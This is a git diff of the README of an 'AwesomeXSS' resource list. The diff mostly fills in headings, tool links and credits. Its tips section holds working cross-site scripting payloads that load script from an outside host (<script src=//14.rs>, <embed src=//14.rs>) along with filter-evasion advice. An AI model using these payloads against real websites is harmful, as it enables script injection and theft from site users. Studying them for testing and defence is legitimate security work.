@@ -1,7 +1,7 @@
 # AwesomeXSS
 Awesome XSS stuff.
-
 Put this repo on watch. I will be updating it regularly.
+
 ### Awesome Books
 - [XSS Cheat Sheet By Brute Logic](http://google.com)
 
@@ -50,6 +50,8 @@ Put this repo on watch. I will be updating it regularly.
 ### Awesome Payloads
 Come back later
 
+### Awesome Exploits
+Come back later
 
 ### Awesome Tags & Event Handlers
 Come back later
@@ -58,7 +60,8 @@ Come back later
 Come back later
 
 ### Awesome Tools
-- (XSStrike)[http://xsstrike.tk/]
+- [XSStrike](http://xsstrike.tk/)
+- [KNOXSS](http://knoxss.me/)
 
 ### Awesome Tips & Tricks
 - http:// can be shortened to //
@@ -67,3 +70,7 @@ Come back later
 - I have found that **confirm** is the least detected pop-up function so stop using alert.
 - Quotes around attribute value aren't neccessary. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"glt;**
 - The shortest independent payload is **&lt;embed src=//14.rs&gt;** (19 chars)
+
+## Credits and all that
+All the payloads are crafted by me unless specified.
+Thanks to my big brother [Rodolfo Assis](https://twitter.com/brutelogic) whose writings inspired me to become an XSSLord.
